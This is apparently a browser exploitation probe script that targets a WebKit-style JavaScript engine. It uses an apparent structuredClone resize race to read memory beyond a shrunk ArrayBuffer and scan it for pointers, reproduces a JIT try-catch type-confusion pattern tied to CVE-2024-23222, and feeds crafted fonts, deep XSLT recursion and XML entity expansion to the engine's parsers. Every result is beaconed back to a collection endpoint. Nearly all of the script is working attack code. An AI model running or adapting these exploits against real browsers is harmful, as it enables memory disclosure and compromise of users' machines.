/* p95-cage-map — Gigacage layout mapping + untested C++ surfaces
 *
 * TWO TRACKS:
 * Track 1: Use within-cage OOB READ to map what's adjacent to RAB
 *          backing stores. Look for pointer-like values, other buffer
 *          metadata, butterfly pointers, cage boundaries.
 * Track 2: Test untested C++ surfaces (XSLT, Web Audio, DOMParser, fonts)
 *
 * Beacon prefix: V95G-
 */
(function(){
"use strict";
var RUN_ID = "v95g" + Math.random().toString(36).slice(2,12);
var PREFIX = "V95G-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press95-cage-map");

/* ====== G1: Spray RABs + OOB read to probe adjacent memory ====== */
function test_G1() {
  var r = {};
  try {
    var SIZE = 4096;
    var MAX = 8192; // maxByteLength = 2x size
    var COUNT = 100;

    // Spray identical RABs
    var bufs = [];
    for (var i = 0; i < COUNT; i++) {
      var ab = new ArrayBuffer(SIZE, { maxByteLength: MAX });
      var u8 = new Uint8Array(ab);
      u8.fill(i & 0xFF); // unique marker per buffer
      bufs.push(ab);
    }
    r.sprayed = bufs.length;

    // Pick middle buffer, shrink it, then OOB read via structuredClone TOCTOU
    var target = bufs[50];
    var targetView = new Uint8Array(target);

    // Fill with recognizable pattern
    for (var j = 0; j < SIZE; j++) targetView[j] = 0xAA;

    // Set up TOCTOU: clone reads MAX bytes but we shrink to 64
    var obj = {};
    obj.buf = target;
    Object.defineProperty(obj, 'zzz', {
      enumerable: true,
      get: function() {
        target.resize(64); // shrink: TOCTOU reads MAX=8192 bytes
        return 1;
      }
    });

    var cloned = structuredClone(obj);
    if (cloned.buf instanceof ArrayBuffer) {
      var cv = new Uint8Array(cloned.buf);
      r.clonedLen = cv.length;

      // Scan PAST the original 4096 bytes for interesting data
      // Bytes 0-63: our 0xAA data (still valid)
      // Bytes 64-4095: stale 0xAA data (within original size)
      // Bytes 4096-8191: ADJACENT MEMORY (the gold)

      // Count byte patterns in the adjacent region (4096-8191)
      var adjacent = { aa: 0, zero: 0, marker: 0, ptr: 0, other: 0 };
      var interestingBytes = [];

      for (var k = SIZE; k < cv.length; k++) {
        if (cv[k] === 0xAA) adjacent.aa++;
        else if (cv[k] === 0) adjacent.zero++;
        else if (cv[k] === 51) adjacent.marker++; // buf[51]'s marker
        else {
          adjacent.other++;
          if (interestingBytes.length < 20) {
            interestingBytes.push(k + ":" + cv[k].toString(16));
          }
        }
      }
      r.adjacent = adjacent;
      r.interesting = interestingBytes.join("|");

      // Dump hex of bytes 4096-4160 (first 64 bytes of adjacent region)
      var hex = [];
      for (var h = SIZE; h < Math.min(SIZE + 64, cv.length); h++) {
        hex.push(cv[h].toString(16).padStart(2, '0'));
      }
      r.adjHex64 = hex.join('');

      // Look for pointer-like patterns (8-byte aligned, non-zero high bytes)
      var dv = new DataView(cloned.buf);
      var ptrLike = [];
      for (var p = SIZE; p < cv.length - 7; p += 8) {
        var lo = dv.getUint32(p, true);
        var hi = dv.getUint32(p + 4, true);
        // Pointer: hi should be non-zero but < 0x00010000 (48-bit VA)
        if (hi > 0 && hi < 0x10000 && (lo & 0x7) === 0) {
          ptrLike.push(p + ":" + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
        }
      }
      r.ptrLike = ptrLike.slice(0, 5).join("|");
      r.HAS_PTRS = ptrLike.length > 0;

      // Check if adjacent data matches another buffer's marker
      var markerFound = -1;
      for (var m = SIZE; m < cv.length; m++) {
        if (cv[m] !== 0xAA && cv[m] !== 0 && cv[m] < COUNT) {
          markerFound = cv[m];
          break;
        }
      }
      r.adjacentBufIdx = markerFound;
      r.ADJACENT_BUF = markerFound >= 0;
    }

    bufs = null;
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("G1-ADJACENT-SCAN", r);
}

/* ====== G2: Larger maxByteLength (64KB) to scan further ====== */
function test_G2() {
  var r = {};
  try {
    var SIZE = 4096;
    var MAX = 65536; // 64KB scan range

    var bufs = [];
    for (var i = 0; i < 50; i++) {
      var ab = new ArrayBuffer(SIZE, { maxByteLength: MAX });
      new Uint8Array(ab).fill(i & 0xFF);
      bufs.push(ab);
    }

    var target = bufs[25];
    new Uint8Array(target).fill(0xBB);

    var obj = {};
    obj.buf = target;
    Object.defineProperty(obj, 'zzz', {
      enumerable: true,
      get: function() { target.resize(64); return 1; }
    });

    var cloned = structuredClone(obj);
    if (cloned.buf instanceof ArrayBuffer) {
      var cv = new Uint8Array(cloned.buf);
      r.clonedLen = cv.length;

      // Sample at key offsets
      var samples = [4096, 8192, 16384, 32768, 49152, 65535];
      for (var si = 0; si < samples.length; si++) {
        var off = samples[si];
        if (off < cv.length) {
          r["at" + off] = cv[off].toString(16);
        }
      }

      // Scan for non-zero, non-0xBB regions
      var regions = [];
      var inRegion = false;
      var regionStart = 0;
      for (var k = SIZE; k < cv.length; k++) {
        var interesting = cv[k] !== 0xBB && cv[k] !== 0;
        if (interesting && !inRegion) {
          inRegion = true;
          regionStart = k;
        } else if (!interesting && inRegion) {
          inRegion = false;
          regions.push(regionStart + "-" + k + "(" + (k - regionStart) + ")");
        }
      }
      if (inRegion) regions.push(regionStart + "-" + cv.length);
      r.regions = regions.slice(0, 8).join("|");
      r.regionCount = regions.length;

      // Hex dump first interesting region
      if (regions.length > 0) {
        var firstOff = parseInt(regions[0]);
        var hex = [];
        for (var h = firstOff; h < Math.min(firstOff + 32, cv.length); h++) {
          hex.push(cv[h].toString(16).padStart(2, '0'));
        }
        r.firstRegionHex = hex.join('');
      }
    }

    bufs = null;
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("G2-WIDE-SCAN", r);
}

/* ====== G3: DFG try-catch type narrowing (CVE-2024-23222 pattern) ====== */
function test_G3() {
  var r = {};
  try {
    var transitioned = false;

    function maybeThrow(obj) {
      if (transitioned) {
        // Transition obj's structure INSIDE the try
        obj.newProp = 42;
        // Don't actually throw — the AI models the exception edge
        // but the structure transition still happens
      }
    }

    function trigger(obj) {
      var x = obj.x; // CheckStructure: AI records structure
      try {
        maybeThrow(obj); // may transition structure
      } catch(e) {}
      // AI may think obj still has original structure
      // GetByOffset uses stale offset for .y
      return obj.y;
    }

    // Warm with consistent objects
    function makeObj() { return { x: 1, y: 2 }; }
    for (var i = 0; i < 200000; i++) trigger(makeObj());
    r.warmOK = true;

    // Now trigger the transition
    transitioned = true;
    var evil = { x: 1, y: 2 };
    var result = trigger(evil);
    r.result = result; // should be 2 if correct, something else if confused
    r.hasNewProp = evil.newProp === 42;
    r.TYPE_CONFUSED = result !== 2;

    // Variant: throw during transition
    transitioned = false;
    function maybeThrow2(obj) {
      obj.z = 99; // add property → transition
      throw new Error("bail");
    }

    function trigger2(obj) {
      var x = obj.x;
      try { maybeThrow2(obj); } catch(e) {}
      return obj.y;
    }

    for (var j = 0; j < 200000; j++) trigger2(makeObj());
    var evil2 = { x: 1, y: 2 };
    var result2 = trigger2(evil2);
    r.result2 = result2;
    r.hasZ = evil2.z === 99;
    r.TYPE_CONFUSED2 = result2 !== 2;

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("G3-TRYCATCH-AI", r);
}

/* ====== G4: API availability check — XSLT, Web Audio, etc ====== */
function test_G4() {
  var r = {};
  try {
    r.XSLT = typeof XSLTProcessor !== 'undefined';
    r.AudioCtx = typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined';
    r.DOMParser2 = typeof DOMParser !== 'undefined';
    r.execCmd = typeof document.execCommand === 'function';
    r.WebSocket2 = typeof WebSocket !== 'undefined';
    r.Crypto = typeof crypto !== 'undefined' && typeof crypto.subtle !== 'undefined';
    r.FormData2 = typeof FormData !== 'undefined';

    // Test XSLT if available
    if (r.XSLT) {
      try {
        var proc = new XSLTProcessor();
        var sheet = new DOMParser().parseFromString(
          '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
          '<xsl:template match="/"><out><xsl:value-of select="."/></out></xsl:template>' +
          '</xsl:stylesheet>', 'text/xml');
        proc.importStylesheet(sheet);
        var doc = new DOMParser().parseFromString('<r>test</r>', 'text/xml');
        var result = proc.transformToFragment(doc, document);
        r.xsltResult = result ? result.textContent.slice(0, 30) : 'null';
        r.XSLT_WORKS = true;
      } catch(e) {
        r.xsltErr = e.message.slice(0, 40);
      }
    }

    // Test Web Audio if available
    if (r.AudioCtx) {
      try {
        var Ctx = window.AudioContext || window.webkitAudioContext;
        var ctx = new Ctx();
        r.audioState = ctx.state;
        r.audioRate = ctx.sampleRate;
        // Create basic nodes
        var osc = ctx.createOscillator();
        var gain = ctx.createGain();
        r.audioNodes = "osc+gain";
        ctx.close();
        r.AUDIO_WORKS = true;
      } catch(e) {
        r.audioErr = e.message.slice(0, 40);
      }
    }

    // Test DOMParser with complex XML
    try {
      var xml = '<?xml version="1.0"?><r xmlns="http://www.w3.org/1999/xhtml">' +
        '<div>' + '<p>'.repeat(100) + 'deep' + '</p>'.repeat(100) + '</div></r>';
      var doc = new DOMParser().parseFromString(xml, 'text/xml');
      r.domParserDeep = doc.documentElement ? "ok" : "null";
      r.parseErr = doc.querySelector('parsererror') ? "yes" : "no";
    } catch(e) {
      r.domParserErr = e.message.slice(0, 40);
    }

  } catch(e) { r.err = e.message.slice(0, 80); }
  B("G4-API-CHECK", r);
}

/* ====== G5: @font-face with crafted minimal font ====== */
function test_G5() {
  var r = {};
  try {
    // Minimal TrueType font (invalid but structured)
    // This tests if @font-face + rendering triggers the font parser
    var fontCSS = '@font-face { font-family: "TestFont"; src: url(data:font/ttf;base64,';

    // Build minimal TTF: just headers, no valid tables
    var ttf = new ArrayBuffer(64);
    var dv = new DataView(ttf);
    // Offset table
    dv.setUint32(0, 0x00010000); // sfVersion
    dv.setUint16(4, 1); // numTables
    dv.setUint16(6, 16); // searchRange
    dv.setUint16(8, 0); // entrySelector
    dv.setUint16(10, 16); // rangeShift
    // Table record for 'head'
    dv.setUint32(12, 0x68656164); // 'head'
    dv.setUint32(16, 0); // checksum
    dv.setUint32(20, 28); // offset
    dv.setUint32(24, 36); // length (points past buffer → overflow?)

    // Base64 encode
    var bytes = new Uint8Array(ttf);
    var b64 = '';
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    for (var i = 0; i < bytes.length; i += 3) {
      var b0 = bytes[i], b1 = bytes[i+1] || 0, b2 = bytes[i+2] || 0;
      b64 += chars[b0 >> 2] + chars[((b0 & 3) << 4) | (b1 >> 4)] +
        chars[((b1 & 0xF) << 2) | (b2 >> 6)] + chars[b2 & 0x3F];
    }

    fontCSS += b64 + ') format("truetype"); }';

    var style = document.createElement('style');
    style.textContent = fontCSS + ' .fonttest { font-family: "TestFont", sans-serif; }';
    document.head.appendChild(style);

    var div = document.createElement('div');
    div.className = 'fonttest';
    div.style.cssText = 'position:absolute;left:-9999px;';
    div.textContent = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ test ￿ \u0000';
    document.body.appendChild(div);

    // Force layout to trigger font loading
    div.offsetWidth;

    setTimeout(function() {
      var cs = getComputedStyle(div);
      r.fontFamily = cs.fontFamily;
      r.rendered = div.offsetWidth > 0;
      r.FONT_PARSED = true; // if we get here, font was attempted
      style.remove();
      div.remove();
      B("G5-FONT", r);
    }, 1000);

  } catch(e) { r.err = e.message.slice(0, 80); B("G5-FONT", r); }
}

/* ====== G6: XSLT with document() + recursive template ====== */
function test_G6() {
  var r = {};
  try {
    if (typeof XSLTProcessor === 'undefined') {
      r.XSLT = false;
      B("G6-XSLT", r);
      return;
    }

    // Deep recursive template — may overflow libxslt stack
    var sheetXML = '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
      '<xsl:template match="/">' +
      '<xsl:call-template name="recurse"><xsl:with-param name="n" select="500"/></xsl:call-template>' +
      '</xsl:template>' +
      '<xsl:template name="recurse">' +
      '<xsl:param name="n"/>' +
      '<xsl:if test="$n &gt; 0">' +
      '<item n="{$n}"/>' +
      '<xsl:call-template name="recurse"><xsl:with-param name="n" select="$n - 1"/></xsl:call-template>' +
      '</xsl:if>' +
      '</xsl:template></xsl:stylesheet>';

    var proc = new XSLTProcessor();
    var sheet = new DOMParser().parseFromString(sheetXML, 'text/xml');
    proc.importStylesheet(sheet);

    var doc = new DOMParser().parseFromString('<root/>', 'text/xml');
    var result = proc.transformToFragment(doc, document);
    r.resultChildren = result ? result.childNodes.length : -1;

    // Entity expansion test
    var xmlWithEntity = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "' +
      'A'.repeat(1000) + '">]><r>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</r>';
    var doc2 = new DOMParser().parseFromString(xmlWithEntity, 'text/xml');
    r.entityLen = doc2.documentElement ? doc2.documentElement.textContent.length : -1;
    r.ENTITY_EXPANSION = r.entityLen > 5000;

    r.XSLT_SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); }
  B("G6-XSLT", r);
}

/* ====== Run ====== */
try {
  test_G1(); // cage scan (4096→8192 range)
  test_G4(); // API availability check
  setTimeout(test_G2, 1000);  // wide cage scan (4096→65536)
  setTimeout(test_G3, 2500);  // DFG try-catch AI
  setTimeout(test_G5, 4000);  // font parsing
  setTimeout(test_G6, 5500);  // XSLT
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe95-done"); }, 25000);
})();
